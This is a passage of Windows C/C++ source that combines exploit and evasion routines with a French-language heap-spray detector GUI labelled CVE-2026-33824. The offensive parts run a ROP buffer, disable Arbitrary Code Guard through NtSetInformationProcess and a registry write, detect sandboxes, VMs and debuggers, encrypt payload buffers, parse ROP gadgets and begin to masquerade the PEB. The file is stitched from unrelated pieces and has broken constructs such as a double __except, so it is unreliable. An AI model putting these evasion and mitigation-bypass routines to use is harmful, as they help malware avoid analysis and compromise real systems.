            ((void(*)())rop_memory)();
            success = 1;
        } __except(EXCEPTION_EXECUTE_HANDLER) {
        }

        VirtualFree(rop_memory, 0, MEM_RELEASE);
        return success;

    }
    return 0;

}

static int disable_acg() {
    typedef NTSTATUS (NTAPI *PNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
    PNtSetInformationProcess NtSetInformationProcess = (PNtSetInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
    if (!NtSetInformationProcess) {
        return 0;

    }
    ULONG acg_policy = 0;
    NTSTATUS status = NtSetInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)0x1E, &acg_policy, sizeof(acg_policy));
    if (status == 0) {
        return 1;

    }
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\ArbitraryCodeGuard", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD enabled = 0;
        if (RegSetValueExA(hKey, "Enabled", 0, REG_DWORD, (BYTE*)&enabled, sizeof(enabled)) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return 1;

        }
        RegCloseKey(hKey);
    }
    return 0;

}

void init_debug_info() {
    memset(&g_Debug, 0, sizeof(g_Debug));
    g_Debug.error_count = 0;
    g_Debug.success_count = 0;

}

void log_error(const char* file, int line, const char* fmt, ...) {
    if (g_Debug.error_count >= 1000) return;
    char temp[512] = {0};
    va_list args;
    va_start(args, fmt);
    vsnprintf(temp, sizeof(temp), fmt, args);
    va_end(args);
    snprintf(g_Debug.last_error_msg, sizeof(g_Debug.last_error_msg),
             "%s | File: %s | Line: %d | GetLastError: %lu",
             temp, file, line, GetLastError());
    g_Debug.error_count++;
    printf("[-] ERROR: %s\n", g_Debug.last_error_msg);
    if (g_LogFile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        g_LogFile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] [ERROR] " << std::wstring(g_Debug.last_error_msg, g_Debug.last_error_msg + strlen(g_Debug.last_error_msg)) << std::endl;
    }
}

void log_success(const char* file, int line, const char* fmt, ...) {
    char temp[512] = {0};
    va_list args;
    va_start(args, fmt);
    vsnprintf(temp, sizeof(temp), fmt, args);
    va_end(args);
    strncpy(g_Debug.last_success_msg, temp, sizeof(g_Debug.last_success_msg) - 1);
    g_Debug.success_count++;
    printf("[+] SUCCESS: %s\n", temp);
    if (g_LogFile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        g_LogFile << L"[" << st.wHour << L":" << st.wMinute << L":" << st.wSecond << L"] [SUCCESS] " << std::wstring(temp, temp + strlen(temp)) << std::endl;
    }
}

int encrypt_buffer(uint8_t* buffer, size_t len) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    BYTE iv[16] = {0};
    DWORD dwDataLen = (DWORD)len;
    if (len % 16 != 0) {
        return 0;

    }
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
        return 0;

    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    if (!CryptHashData(hHash, g_aes_key, sizeof(g_aes_key), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    memcpy(iv, g_aes_iv, sizeof(iv));
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dwDataLen, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer, &dwDataLen, (DWORD)len)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return 1;

}

void generate_random_spi(uint8_t* spi) {
    if (!safe_random_bytes(spi, 8)) {
        memset(spi, 0xAA, 8);
    }
}

int safe_random_bytes(uint8_t* buffer, size_t size) {
    if (!buffer || size == 0) {
        return 0;

    }
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
        return 0;

    }
    if (!CryptGenRandom(hProv, (DWORD)size, buffer)) {
        CryptReleaseContext(hProv, 0);
        return 0;

    }
    CryptReleaseContext(hProv, 0);
    return 1;

}

void fill_random_buffer(uint8_t* buffer, size_t len) {
    if (!buffer || len == 0) return;
    safe_random_bytes(buffer, len);

}

void fill_malformed_data(uint8_t* buffer, size_t len, uint8_t base_pattern) {
    if (!buffer || len == 0) return;
    for (size_t i = 0; i < len; i++) {
        buffer[i] = (uint8_t)(base_pattern + (i % 0xFF));
    }
}

int append_bytes(uint8_t* buffer, size_t* offset, size_t buffer_size, const char* bytes, size_t len) {
    if (!buffer || !offset || *offset + len > buffer_size) {
        return 0;

    }
    memcpy(buffer + *offset, bytes, len);
    *offset += len;
    return 1;

}

int append_u8(uint8_t* buffer, size_t* offset, size_t buffer_size, uint8_t value) {
    if (!buffer || !offset || *offset + sizeof(uint8_t) > buffer_size) {
        return 0;

    }
    *(uint8_t*)(buffer + *offset) = value;
    *offset += sizeof(uint8_t);
    return 1;

}

int append_u16_be(uint8_t* buffer, size_t* offset, size_t buffer_size, uint16_t value) {
    if (!buffer || !offset || *offset + sizeof(uint16_t) > buffer_size) {
        return 0;

    }
    uint16_t be_value = HTONS(value);
    memcpy(buffer + *offset, &be_value, sizeof(uint16_t));
    *offset += sizeof(uint16_t);
    return 1;

}

int append_u32_be(uint8_t* buffer, size_t* offset, size_t buffer_size, uint32_t value) {
    if (!buffer || !offset || *offset + sizeof(uint32_t) > buffer_size) {
        return 0;

    }
    uint32_t be_value = HTONL(value);
    memcpy(buffer + *offset, &be_value, sizeof(uint32_t));
    *offset += sizeof(uint32_t);
    return 1;

}

int is_sandbox_environment() {
    DWORD start_time = GetTickCount();
    Sleep(100);
    DWORD end_time = GetTickCount();
    if (end_time - start_time < 50) {
        return 1;

    }

    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    if (GlobalMemoryStatusEx(&mem_status)) {
        if (mem_status.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) {
            return 1;

        }
    }

    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    if (sys_info.dwNumberOfProcessors <= 2) {
        return 1;

    }

    if (GetFileAttributesA("C:\\Windows\\System32\\drivers\\VBoxMouse.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\Windows\\System32\\drivers\\VBoxGuest.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\Windows\\System32\\drivers\\VBoxSF.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\Windows\\System32\\drivers\\vmhgfs.sys") != INVALID_FILE_ATTRIBUTES) {
        return 1;

    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                char* process_name = _strlwr(_strdup(pe32.szExeFile));
                if (strstr(process_name, "sandbox") ||
                    strstr(process_name, "vmware") ||
                    strstr(process_name, "virtual") ||
                    strstr(process_name, "vbox") ||
                    strstr(process_name, "qemu") ||
                    strstr(process_name, "xenservice")) {
                    free(process_name);
                    CloseHandle(hSnapshot);
                    return 1;

                }
                free(process_name);
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    return 0;

}

int is_debugged() {
    typedef struct _PEB {
        BYTE Reserved1[2];
        BYTE BeingDebugged;
        BYTE Reserved2[1];
        PVOID Reserved3[2];
        PVOID Ldr;
    } PEB, *PPEB;

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb && pPeb->BeingDebugged) {
        return 1;

    }

    typedef NTSTATUS (NTAPI *PNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    PNtQueryInformationProcess NtQueryInformationProcess = (PNtQueryInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess) {
        int debug_port = 0;
        if (NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &debug_port, sizeof(debug_port), NULL) == 0) {
            if (debug_port != 0) {
                return 1;

            }
        }
    }

    DWORD start_time = GetTickCount();
    for (volatile int i = 0; i < 0x100000; i++);
    DWORD end_time = GetTickCount();
    if (end_time - start_time > 100) {
        return 1;

    }

    __try {
        __asm { int 3 };
    } __except(EXCEPTION_EXECUTE_HANDLER) {
    } __except(EXCEPTION_CONTINUE_EXECUTION) {
        return 1;

    }

    return 0;

}

int parse_rop_essentials_file(const char* filename, ROP_GADGET_ENTRY* gadgets, int max_gadgets) {
    if (!filename || !gadgets || max_gadgets <= 0) {
        return 0;

    }

    FILE* file = fopen(filename, "r");
    if (!file) {
        return 0;

    }

    int gadget_count = 0;
    char line[1024];

    while (fgets(line, sizeof(line), file) && gadget_count < max_gadgets) {
        if (line[0] == '\n' || line[0] == '#' || line[0] == ';') {
            continue;
        }

        char* addr_str = strtok(line, " :");
        char* instr_str = strtok(NULL, "\n");

        if (!addr_str || !instr_str) {
            continue;
        }

        uint64_t address;
        if (sscanf(addr_str, "%llx", &address) != 1) {
            continue;
        }

        char* instr_clean = instr_str;
        while (*instr_clean == ' ') instr_clean++;
        size_t instr_len = strlen(instr_clean);
        if (instr_len > 0 && instr_clean[instr_len - 1] == '\r') {
            instr_clean[instr_len - 1] = '\0';
        }

        ROP_GADGET_TYPE type = ROP_GADGET_POP_RAX;
        if (strstr(instr_clean, "pop rax")) type = ROP_GADGET_POP_RAX;
        else if (strstr(instr_clean, "pop rcx")) type = ROP_GADGET_POP_RCX;
        else if (strstr(instr_clean, "pop rdx")) type = ROP_GADGET_POP_RDX;
        else if (strstr(instr_clean, "pop rbx")) type = ROP_GADGET_POP_RBX;
        else if (strstr(instr_clean, "pop rsp")) type = ROP_GADGET_POP_RSP;
        else if (strstr(instr_clean, "pop rbp")) type = ROP_GADGET_POP_RBP;
        else if (strstr(instr_clean, "pop rsi")) type = ROP_GADGET_POP_RSI;
        else if (strstr(instr_clean, "pop rdi")) type = ROP_GADGET_POP_RDI;
        else if (strstr(instr_clean, "pop r8")) type = ROP_GADGET_POP_R8;
        else if (strstr(instr_clean, "pop r9")) type = ROP_GADGET_POP_R9;
        else if (strstr(instr_clean, "pop r10")) type = ROP_GADGET_POP_R10;
        else if (strstr(instr_clean, "pop r11")) type = ROP_GADGET_POP_R11;
        else if (strstr(instr_clean, "pop r12")) type = ROP_GADGET_POP_R12;
        else if (strstr(instr_clean, "pop r13")) type = ROP_GADGET_POP_R13;
        else if (strstr(instr_clean, "pop r14")) type = ROP_GADGET_POP_R14;
        else if (strstr(instr_clean, "pop r15")) type = ROP_GADGET_POP_R15;
        else if (strstr(instr_clean, "mov rax, rsp")) type = ROP_GADGET_MOV_RAX_RSP;
        else if (strstr(instr_clean, "jmp rsp")) type = ROP_GADGET_JMP_RSP;
        else if (strstr(instr_clean, "ret")) type = ROP_GADGET_RET;
        else if (strstr(instr_clean, "mov [gs:0x60]")) type = ROP_GADGET_MOV_GS_60_RAX;
        else if (strstr(instr_clean, "jmp [rax+0x58]")) type = ROP_GADGET_JMP_RAX_PLUS_58;

        gadgets[gadget_count].address = address;
        gadgets[gadget_count].instruction = strdup(instr_clean);
        gadgets[gadget_count].type = type;
        gadgets[gadget_count].byte_count = 0;
        gadget_count++;
    }

    fclose(file);
    return gadget_count;

}

int CountRopGadgets(const BYTE* data, SIZE_T size) {
    int gadgetCount = 0;
    for (SIZE_T i = 0; i < size - 2; i++) {
        if ((data[i] >= 0x58 && data[i] <= 0x5F) && data[i + 1] == 0xC3) {
            gadgetCount++;
        } else if (data[i] == 0x87 && data[i + 2] == 0xC3) {
            gadgetCount++;
        } else if (data[i] == 0xC3) {
            gadgetCount++;
        }
    }
    return gadgetCount;

}

double CalculateEntropy(const BYTE* data, SIZE_T size) {
    if (size == 0) return 0.0;
    std::map<BYTE, int> freq;
    for (SIZE_T i = 0; i < size; i++) {
        freq[data[i]]++;
    }
    double entropy = 0.0;
    for (const auto& pair : freq) {
        double p = (double)pair.second / size;
        entropy -= p * log2(p);
    }
    return entropy;

}

bool DetectNopSled(const BYTE* data, SIZE_T size) {
    int nopCount = 0;
    for (SIZE_T i = 0; i < size; i++) {
        if (data[i] == 0x90) {
            nopCount++;
            if (nopCount > 100) return true;
        } else {
            nopCount = 0;
        }
    }
    return false;

}

bool DetectEggHunter(const BYTE* data, SIZE_T size) {
    if (size < 8) return false;
    for (SIZE_T i = 0; i < size - 8; i++) {
        DWORD tag1 = *(DWORD*)(data + i);
        DWORD tag2 = *(DWORD*)(data + i + 4);
        if (tag1 == tag2 && tag1 != 0 && tag1 != 0xFFFFFFFF) {
            SIZE_T window = std::min(1024, (int)(size - i));
            int repeatCount = 0;
            for (SIZE_T j = i; j < i + window - 4; j++) {
                if (*(DWORD*)(data + j) == tag1) {
                    repeatCount++;
                }
            }
            if (repeatCount > 10) return true;
        }
    }
    return false;

}

bool DetectShellcodePatterns(const BYTE* data, SIZE_T size) {
    const BYTE patterns[][8] = {
        { 0x64, 0x8B, 0x00 },
        { 0x64, 0xA1, 0x30, 0x00 },
        { 0x8B, 0x40, 0x0C },
        { 0xFF, 0xD0 },
        { 0xFF, 0xE0 }
    };
    int patternMatches = 0;
    for (const auto& pattern : patterns) {
        SIZE_T patternLen = 0;
        for (int i = 0; i < 8 && pattern[i] != 0; i++) patternLen++;
        for (SIZE_T i = 0; i < size - patternLen; i++) {
            bool match = true;
            for (SIZE_T j = 0; j < patternLen; j++) {
                if (data[i + j] != pattern[j]) {
                    match = false;
                    break;
                }
            }
            if (match) {
                patternMatches++;
                if (patternMatches >= 3) return true;
            }
        }
    }
    return false;

}

std::wstring GetProtectionString(DWORD protect) {
    std::wstring result;
    if (protect & PAGE_EXECUTE_READWRITE) result += L"RWX";
    else if (protect & PAGE_EXECUTE_READ) result += L"RX";
    else if (protect & PAGE_READWRITE) result += L"RW";
    else if (protect & PAGE_READONLY) result += L"R";
    else result += L"Unknown";
    if (protect & PAGE_GUARD) result += L" +GUARD";
    if (protect & PAGE_NOCACHE) result += L" +NOCACHE";
    return result;

}

std::wstring GetCriticality(double entropy, const std::wstring& pattern) {
    int score = 0;
    if (pattern.find(L"NOP sled") != std::wstring::npos) score += 3;
    if (pattern.find(L"Egg hunter") != std::wstring::npos) score += 4;
    if (pattern.find(L"Shellcode patterns") != std::wstring::npos) score += 5;
    if (pattern.find(L"ROP gadgets") != std::wstring::npos) score += 3;
    if (entropy > 7.5) score += 4;
    else if (entropy > 7.0) score += 2;
    if (score >= 8) return L"CRITIQUE";
    else if (score >= 5) return L"ÉLEVÉE";
    else return L"MOYENNE";

}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam) {
    switch (msg) {
        case WM_CREATE: {
            CreateWindowW(L"STATIC", L"Processus cible:", WS_CHILD | WS_VISIBLE | SS_LEFT, 10, 15, 120, 20, hwnd, NULL, GetModuleHandle(NULL), NULL);
            g_hComboProcess = CreateWindowW(L"COMBOBOX", L"", WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST | WS_VSCROLL, 140, 10, 400, 300, hwnd, (HMENU)1001, GetModuleHandle(NULL), NULL);
            PopulateProcessList();
            g_hListView = CreateWindowExW(0, WC_LISTVIEWW, L"", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL | WS_BORDER, 10, 50, 1160, 540, hwnd, (HMENU)1002, GetModuleHandle(NULL), NULL);
            InitListView(g_hListView);
            CreateWindowW(L"BUTTON", L"Scanner Processus", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 560, 10, 180, 30, hwnd, (HMENU)1003, GetModuleHandle(NULL), NULL);
            CreateWindowW(L"BUTTON", L"Dump Région", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 750, 10, 120, 30, hwnd, (HMENU)1004, GetModuleHandle(NULL), NULL);
            CreateWindowW(L"BUTTON", L"Exporter CSV", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 880, 10, 130, 30, hwnd, (HMENU)1005, GetModuleHandle(NULL), NULL);
            g_hStatus = CreateWindowW(L"STATIC", L"Sélectionnez un processus et cliquez sur 'Scanner Processus'", WS_CHILD | WS_VISIBLE | SS_LEFT, 10, 600, 1160, 20, hwnd, (HMENU)1006, GetModuleHandle(NULL), NULL);
            return 0;
        }
        case WM_COMMAND: {
            if (LOWORD(wparam) == 1003) {
                int sel = ComboBox_GetCurSel(g_hComboProcess);
                if (sel == CB_ERR) {
                    MessageBoxW(hwnd, L"Veuillez sélectionner un processus", L"Info", MB_ICONINFORMATION);
                    break;
                }
                g_SelectedPID = (DWORD)ComboBox_GetItemData(g_hComboProcess, sel);
                SetWindowTextW(g_hStatus, L"Scan en cours...");
                ScanProcess();
            } else if (LOWORD(wparam) == 1004) {
                DumpSelectedRegion();
            } else if (LOWORD(wparam) == 1005) {
                ExportToCSV();
            }
            break;
        }
        case WM_DESTROY: {
            PostQuitMessage(0);
            return 0;
        }
    }
    return DefWindowProcW(hwnd, msg, wparam, lparam);

}

void InitListView(HWND hList) {
    ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
    LVCOLUMNW col = { LVCF_TEXT | LVCF_WIDTH };
    const wchar_t* headers[] = { L"Adresse", L"Taille", L"Protection", L"Entropie", L"Pattern Détecté", L"Criticité" };
    int widths[] = { 120, 120, 150, 100, 380, 100 };
    for (int i = 0; i < 6; i++) {
        col.pszText = (LPWSTR)headers[i];
        col.cx = widths[i];
        ListView_InsertColumn(hList, i, &col);
    }
}

void PopulateProcessList() {
    ComboBox_ResetContent(g_hComboProcess);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;
            std::wstringstream ss;
            ss << pe.szExeFile << L" (PID: " << pe.th32ProcessID << L")";
            int index = ComboBox_AddString(g_hComboProcess, ss.str().c_str());
            ComboBox_SetItemData(g_hComboProcess, index, pe.th32ProcessID);
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    ComboBox_SetCurSel(g_hComboProcess, 0);

}

void Log(const std::wstring& message) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    std::wstringstream ss;
    ss << std::setfill(L'0') << std::setw(2) << st.wHour << L":" << std::setw(2) << st.wMinute << L":" << std::setw(2) << st.wSecond << L" - " << message << std::endl;
    if (g_LogFile.is_open()) {
        g_LogFile << ss.str();
        g_LogFile.flush();
    }
}

void ScanProcess() {
    std::lock_guard<std::mutex> lock(g_Mutex);
    g_Regions.clear();
    ListView_DeleteAllItems(g_hListView);
    Log(L"Début scan PID " + std::to_wstring(g_SelectedPID));
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, g_SelectedPID);
    if (!hProcess) {
        Log(L"ERREUR: Impossible d'ouvrir le processus");
        MessageBoxW(GetParent(g_hListView), L"Échec d'ouverture du processus", L"Erreur", MB_ICONERROR);
        return;
    }
    PVOID address = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED) && mbi.RegionSize >= 1048576) {
            std::vector<BYTE> buffer(mbi.RegionSize);
            SIZE_T bytesRead;
            if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead)) {
                double entropy = CalculateEntropy(buffer.data(), bytesRead);
                std::wstring pattern = L"";
                bool suspicious = false;
                if (DetectNopSled(buffer.data(), bytesRead)) {
                    pattern += L"NOP sled; ";
                    suspicious = true;
                }
                if (DetectEggHunter(buffer.data(), bytesRead)) {
                    pattern += L"Egg hunter; ";
                    suspicious = true;
                }
                if (DetectShellcodePatterns(buffer.data(), bytesRead)) {
                    pattern += L"Shellcode patterns; ";
                    suspicious = true;
                }
                int ropCount = CountRopGadgets(buffer.data(), bytesRead);
                if (ropCount > 10) {
                    pattern += L"ROP gadgets (" + std::to_wstring(ropCount) + L"); ";
                    suspicious = true;
                }
                if (entropy > 7.0) {
                    pattern += L"Haute entropie (encodé); ";
                    suspicious = true;
                }
                if (suspicious) {
                    SUSPICIOUS_REGION region;
                    region.address = mbi.BaseAddress;
                    region.size = mbi.RegionSize;
                    region.protection = mbi.Protect;
                    region.entropy = entropy;
                    region.patternDetected = pattern.empty() ? L"Aucun" : pattern;
                    region.criticality = GetCriticality(entropy, pattern);
                    g_Regions.push_back(region);
                    Log(L"Région suspecte: " + std::to_wstring((ULONG_PTR)region.address) + L" - " + region.patternDetected);
                }
            }
        }
        address = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }
    CloseHandle(hProcess);
    int index = 0;
    for (const auto& region : g_Regions) {
        LVITEMW item = { LVIF_TEXT };
        item.iItem = index++;
        std::wstringstream addrSS;
        addrSS << L"0x" << std::hex << std::uppercase << (ULONG_PTR)region.address;
        std::wstring addrStr = addrSS.str();
        item.pszText = (LPWSTR)addrStr.c_str();
        ListView_InsertItem(g_hListView, &item);
        std::wstring sizeStr = std::to_wstring(region.size / 1024) + L" KB";
        ListView_SetItemText(g_hListView, item.iItem, 1, (LPWSTR)sizeStr.c_str());
        std::wstring protStr = GetProtectionString(region.protection);
        ListView_SetItemText(g_hListView, item.iItem, 2, (LPWSTR)protStr.c_str());
        std::wstringstream entropySS;
        entropySS << std::fixed << std::setprecision(2) << region.entropy;
        std::wstring entropyStr = entropySS.str();
        ListView_SetItemText(g_hListView, item.iItem, 3, (LPWSTR)entropyStr.c_str());
        ListView_SetItemText(g_hListView, item.iItem, 4, (LPWSTR)region.patternDetected.c_str());
        ListView_SetItemText(g_hListView, item.iItem, 5, (LPWSTR)region.criticality.c_str());
    }
    Log(L"Scan terminé: " + std::to_wstring(g_Regions.size()) + L" région(s) suspecte(s)");
    SetWindowTextW(g_hStatus, L"Scan terminé. Régions suspectes trouvées.");

}

void DumpSelectedRegion() {
    int selected = ListView_GetNextItem(g_hListView, -1, LVNI_SELECTED);
    if (selected == -1) {
        MessageBoxW(GetParent(g_hListView), L"Aucune région sélectionnée", L"Info", MB_ICONINFORMATION);
        return;
    }
    if (selected >= (int)g_Regions.size()) return;
    const auto& region = g_Regions[selected];
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, g_SelectedPID);
    if (!hProcess) {
        MessageBoxW(GetParent(g_hListView), L"Échec d'ouverture du processus", L"Erreur", MB_ICONERROR);
        return;
    }
    std::vector<BYTE> buffer(region.size);
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, region.address, buffer.data(), region.size, &bytesRead)) {
        CloseHandle(hProcess);
        MessageBoxW(GetParent(g_hListView), L"Échec de lecture mémoire", L"Erreur", MB_ICONERROR);
        return;
    }
    CloseHandle(hProcess);
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstringstream filename;
    filename << tempPath << L"heapspray_" << g_SelectedPID << L"_" << std::hex << (ULONG_PTR)region.address << L".bin";
    std::ofstream dumpFile(filename.str(), std::ios::binary);
    if (dumpFile) {
        dumpFile.write((char*)buffer.data(), bytesRead);
        dumpFile.close();
        std::wstring msg = L"Dump sauvegardé: " + filename.str();
        MessageBoxW(GetParent(g_hListView), msg.c_str(), L"Succès", MB_ICONINFORMATION);
        Log(msg);
    } else {
        MessageBoxW(GetParent(g_hListView), L"Échec de sauvegarde du dump", L"Erreur", MB_ICONERROR);
    }
}

void ExportToCSV() {
    wchar_t filename[MAX_PATH] = L"heapspray_analysis.csv";
    OPENFILENAMEW ofn = { sizeof(OPENFILENAMEW) };
    ofn.hwndOwner = GetParent(g_hListView);
    ofn.lpstrFilter = L"CSV Files\0*.csv\0All Files\0*.*\0";
    ofn.lpstrFile = filename;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_OVERWRITEPROMPT;
    if (!GetSaveFileNameW(&ofn)) return;
    std::wofstream csvFile(filename, std::ios::binary);
    if (!csvFile) {
        MessageBoxW(GetParent(g_hListView), L"Échec d'ouverture du fichier CSV", L"Erreur", MB_ICONERROR);
        return;
    }
    const unsigned char bom[] = { 0xEF, 0xBB, 0xBF };
    csvFile.write((wchar_t*)bom, sizeof(bom));
    csvFile.imbue(std::locale(csvFile.getloc(), new std::codecvt_utf8<wchar_t, 0x10ffff, std::consume_header>));
    csvFile << L"Adresse,Taille,Protection,Entropie,PatternDétecté,Criticité\n";
    for (const auto& region : g_Regions) {
        csvFile << L"0x" << std::hex << std::uppercase << (ULONG_PTR)region.address << L"," << std::dec << region.size << L",\"" << GetProtectionString(region.protection) << L"\"," << std::fixed << std::setprecision(2) << region.entropy << L",\"" << region.patternDetected << L"\",\"" << region.criticality << L"\"\n";
    }
    csvFile.close();
    std::wstring msg = L"Export CSV terminé: " + std::wstring(filename);
    MessageBoxW(GetParent(g_hListView), msg.c_str(), L"Succès", MB_ICONINFORMATION);
    Log(msg);

}

int WINAPI wWinMain_sub_2(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring logPath = std::wstring(tempPath) + L"WinTools_HeapSprayDetector_log.txt";
    g_LogFile.open(logPath, std::ios::app);
    g_LogFile.imbue(std::locale(g_LogFile.getloc(), new std::codecvt_utf8<wchar_t>));
    Log(L"========== HeapSprayDetector - Démarrage ============");

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }

    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_LISTVIEW_CLASSES };
    InitCommonControlsEx(&icex);

    WNDCLASSEXW wc = { sizeof(WNDCLASSEXW) };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"HeapSprayDetectorClass";
    wc.hIcon = LoadIcon(NULL, IDI_WARNING);
    wc.hIconSm = LoadIcon(NULL, IDI_WARNING);

    if (!RegisterClassExW(&wc)) {
        MessageBoxW(NULL, L"Échec d'enregistrement de la classe de fenêtre!", L"Erreur", MB_ICONERROR);
        return 1;

    }

    HWND hWnd = CreateWindowExW(
        WS_EX_APPWINDOW,
        wc.lpszClassName,
        L"Heap Spray Detector - CVE-2026-33824",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        1200, 700,
        NULL, NULL, hInstance, NULL);

    if (!hWnd) {
        MessageBoxW(NULL, L"Échec de création de la fenêtre!", L"Erreur", MB_ICONERROR);
        return 1;

    }

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    g_LogFile.close();
    return (int)msg.wParam;

}

BOOL MasqueradePEB() {
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;

    typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClass,
        PVOID ProcessInformation,
        DWORD ProcessInformationLength,
        PDWORD ReturnLength
    );

    typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
        PRTL_CRITICAL_SECTION CriticalSection
    );

    typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
        PRTL_CRITICAL_SECTION CriticalSection
    );

    typedef void (WINAPI* _RtlInitUnicodeString)(
        PUNICODE_STRING DestinationString,
        PCWSTR SourceString
    );

    typedef struct _LIST_ENTRY {
